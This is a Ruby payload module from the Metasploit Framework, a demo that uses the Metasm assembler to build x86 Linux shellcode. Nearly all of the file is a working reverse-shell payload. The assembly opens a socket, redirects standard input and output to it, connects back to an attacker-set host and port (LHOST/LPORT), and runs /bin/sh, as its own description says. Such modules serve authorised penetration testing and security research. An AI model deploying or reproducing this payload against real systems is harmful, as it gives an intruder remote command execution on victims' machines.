# $Id: shell_reverse_tcp.rb 4984 2007-06-09 02:25:31Z hdm $
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##

require 'metasm'
require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'

module Msf
module Payloads
module Singles
module Linux
module X86

module ShellReverseTcp2

	include Msf::Payload::Single
	include Msf::Payload::Linux
	
	def initialize(info = {})

# Remark: this function seems to be called a LOT, even before the shellcode is used.
# We would better implement some caching.

# We decoded skape's shellcode by using irb -r metasm-shell
# and: puts shellcode.decode
	sc=Metasm::Shellcode.assemble(Metasm::Ia32.new, <<EOS).encoded
xor ebx, ebx                  ; @00000000   31db
  push ebx                      ; @00000002   53
  inc ebx                       ; @00000003   43
  push ebx                      ; @00000004   53
  push 2                        ; @00000005   6a02
  push 66h                      ; @00000007   6a66
  pop eax                       ; @00000009   58
  mov ecx, esp                  ; @0000000a   89e1
  int 80h                       ; @0000000c   cd80
  xchg ebx, eax                 ; @0000000e   93
  pop ecx                       ; @0000000f   59

; Xrefs: 0000000f, 00000015
xref_00000010_uuidfdbd8f60c:
  mov al, 3fh                   ; @00000010   b03f
  int 80h                       ; @00000012   cd80
  dec ecx                       ; @00000014   49
  jns xref_00000010_uuidfdbd8f60c ; @00000015   79f9  -- to 10h

; Xrefs: 00000015
  pop ebx                       ; @00000017   5b
  pop edx                       ; @00000018   5a
  push LHOST                    ; @00000019   687f000001
  push.i16 LPORT                ; @0000001e   6668bfbf
  inc ebx                       ; @00000022   43
  push bx                       ; @00000023   6653
  mov ecx, esp                  ; @00000025   89e1
  mov al, 66h                   ; @00000027   b066
  push eax                      ; @00000029   50
  push ecx                      ; @0000002a   51
  push ebx                      ; @0000002b   53
  mov ecx, esp                  ; @0000002c   89e1
  inc ebx                       ; @0000002e   43
  int 80h                       ; @0000002f   cd80
  push edx                      ; @00000031   52
  push 68732f2fh                ; @00000032   682f2f7368
  push 6e69622fh                ; @00000037   682f62696e
  mov ebx, esp                  ; @0000003c   89e3
  push edx                      ; @0000003e   52
  push ebx                      ; @0000003f   53
  mov ecx, esp                  ; @00000040   89e1
  mov al, 0bh                   ; @00000042   b00b
  int 80h                       ; @00000044   cd80
EOS

		super(merge_info(info,
			'Name'          => 'Linux Command Shell, Reverse TCP Inline - Metasm demo',
			'Version'       => '$Revision: 4984 $',
			'Description'   => 'Connect back to attacker and spawn a command shell',
			'Author'        => 'skape + Yoann Guillot and Julien Tinnes for metasm PoC',
			'License'       => MSF_LICENSE,
			'Platform'      => 'linux',
			'Arch'          => ARCH_X86,
			'Handler'       => Msf::Handler::ReverseTcp,
			'Session'       => Msf::Sessions::CommandShell,
			'Payload'       =>
				{
					'Offsets' =>
						{
							'LHOST'    => [ sc.offset_of_reloc('LHOST'), 'ADDR' ],
							'LPORT'    => [ sc.offset_of_reloc('LPORT'), 'n'    ],
						},
					'Payload' => sc.data
									}
			))
	end

end

end end end end end
